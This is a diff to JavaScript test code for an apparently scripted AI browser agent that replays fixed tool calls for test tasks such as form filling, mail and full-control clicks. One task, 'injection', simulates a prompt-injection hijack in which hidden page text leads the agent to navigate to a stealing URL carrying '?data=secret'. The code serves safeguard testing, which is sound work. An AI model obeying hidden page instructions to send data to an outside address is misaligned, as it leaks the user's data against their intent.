@@ -145,35 +145,41 @@ function refIn(messages, role, name) {
 
 /**
  * The next step of the script the agent's task names: one tool call, or a
- * text answer. The step is how many tool calls the conversation already
- * holds; each script reads the page first and ends with done, saying what
- * the last answer it got was.
+ * text answer. The step is how many tool calls of the model's the
+ * conversation already holds; the page comes with the task (its outline, or
+ * a screenshot under full control), so a script acts at once, and ends with
+ * done, saying what the last answer it got was.
  */
 async function agentReply(messages, { stealUrl, openUrl, locate }) {
   const task = text(messages.find((m) => m.role === "user"));
-  const step = messages.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).length;
+  // The panel's own reads for the model (the page it starts on, the page after a change) are not the model's steps.
+  const calls = messages.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls) && !m.tool_calls.every((c) => String(c.id).startsWith("agent_read_")));
+  // Under full control the task comes with a screenshot, not an outline: a script that acts by reference reads the
+  // page first, as a model would, and that read is not one of its steps.
+  const byRef = [AGENT_TASKS.form, AGENT_TASKS.password, AGENT_TASKS.buy, AGENT_TASKS.injection, AGENT_TASKS.stop, AGENT_TASKS.mail, AGENT_TASKS.editor].some((key) => task.startsWith(key));
+  const hasOutline = messages.some((m) => m.role === "tool" && String(m.content).includes("URL:"));
+  if (byRef && !hasOutline) return { tool: "read_page", args: {} };
+  const readFirst = byRef && calls[0]?.tool_calls?.[0]?.function?.name === "read_page" ? 1 : 0;
+  const step = calls.length - readFirst;
   const last = String([...messages].reverse().find((m) => m.role === "tool")?.content ?? "");
   const answered = (label) => ({ tool: "done", args: { summary: `${label}: ${last.replace(/<[^>]+>/g, "").trim().slice(0, 400)}` } });
   const script = {
     [AGENT_TASKS.form]: [
-      () => ({ tool: "read_page", args: {} }),
       (m) => ({ tool: "type_text", args: { ref: refIn(m, "textbox", "Full name"), text: AGENT_NAME } }),
       (m) => ({ tool: "submit_form", args: { ref: refIn(m, "button", "Send request") } }),
-      () => ({ tool: "read_page", args: {} }),
-      (m) => ({ tool: "done", args: { summary: `Form sent: ${/# (Thanks, [^\n]*)/.exec(String([...m].reverse().find((x) => x.role === "tool")?.content ?? ""))?.[1] ?? "no thanks page"}` } }),
+      // Without full control the page after the send comes with its result; with it, a screenshot does, so read it.
+      (m) => (thanks(m) ? formDone(m) : { tool: "read_page", args: {} }),
+      (m) => formDone(m),
     ],
     [AGENT_TASKS.password]: [
-      () => ({ tool: "read_page", args: {} }),
       (m) => ({ tool: "type_text", args: { ref: refIn(m, "textbox", "Password"), text: "hunter2" } }),
       () => answered("Password step"),
     ],
     [AGENT_TASKS.buy]: [
-      () => ({ tool: "read_page", args: {} }),
       (m) => ({ tool: "click", args: { ref: refIn(m, "button", "Buy now") } }),
       () => answered("Buy step"),
     ],
     [AGENT_TASKS.injection]: [
-      () => ({ tool: "read_page", args: {} }),
       // As if the page's hidden text had hijacked the model.
       () => ({ tool: "navigate", args: { url: `${stealUrl}?data=secret` } }),
       () => answered("Navigation step"),
@@ -183,25 +189,21 @@ async function agentReply(messages, { stealUrl, openUrl, locate }) {
       () => answered("Blocked step"),
     ],
     [AGENT_TASKS.stop]: [
-      () => ({ tool: "read_page", args: {} }),
       () => ({ tool: "wait_for", args: { seconds: 10 } }),
       () => answered("Waited"),
     ],
     // Full control: look at the page, then click with the real mouse where the target is in the screenshot.
     [AGENT_TASKS.control]: [
-      () => ({ tool: "screenshot", args: {} }),
       (m) => pointAt(m, "Control step"),
       () => answered("Control step"),
     ],
     // Full control, a button at the bottom of the window: below 800 pixels in a tall one.
     [AGENT_TASKS.low]: [
-      () => ({ tool: "screenshot", args: {} }),
       (m) => pointAt(m, "Low step"),
       () => answered("Low step"),
     ],
     // Full control, a button that opens a confirm dialog: the click waits until the dialog is answered.
     [AGENT_TASKS.dialog]: [
-      () => ({ tool: "screenshot", args: {} }),
       (m) => pointAt(m, "Dialog step"),
       () => answered("Dialog step"),
     ],
@@ -229,7 +231,6 @@ async function agentReply(messages, { stealUrl, openUrl, locate }) {
     // A Gmail-like page: the list scrolls inside the page, the compose window is docked at its end; the recipient
     // becomes a chip on Enter, the body has a signature, and Send is at the bottom. By reference, under full control.
     [AGENT_TASKS.mail]: [
-      () => ({ tool: "read_page", args: {} }),
       () => ({ tool: "scroll", args: { direction: "down" } }),
       (m) => ({ tool: "type_text", args: { ref: refIn(m, "combobox", "To recipients"), text: MAIL.to } }),
       () => ({ tool: "press_key", args: { key: "Enter" } }),
@@ -240,7 +241,6 @@ async function agentReply(messages, { stealUrl, openUrl, locate }) {
     ],
     // An editor that does its own typing (beforeinput), a date with a value, and a checkbox hidden under its label.
     [AGENT_TASKS.editor]: [
-      () => ({ tool: "read_page", args: {} }),
       (m) => ({ tool: "type_text", args: { ref: refIn(m, "textbox", "Bio"), text: EDITOR.bio } }),
       (m) => ({ tool: "type_text", args: { ref: refIn(m, "textbox", "Birthday"), text: EDITOR.birthday, clear: true } }),
       (m) => ({ tool: "click", args: { ref: refIn(m, "checkbox", "Send me news") } }),
@@ -254,6 +254,12 @@ async function agentReply(messages, { stealUrl, openUrl, locate }) {
       () => answered("Scroll step"),
     ],
   };
+  function thanks(m) {
+    return /# (Thanks, [^\n]*)/.exec(String([...m].reverse().find((x) => x.role === "tool")?.content ?? ""))?.[1];
+  }
+  function formDone(m) {
+    return { tool: "done", args: { summary: `Form sent: ${thanks(m) ?? "no thanks page"}` } };
+  }
   /** A click at the target as the last screenshot shows it; done, saying so, when it shows none. */
   async function pointAt(m, label) {
     const shot = lastScreenshot(m);
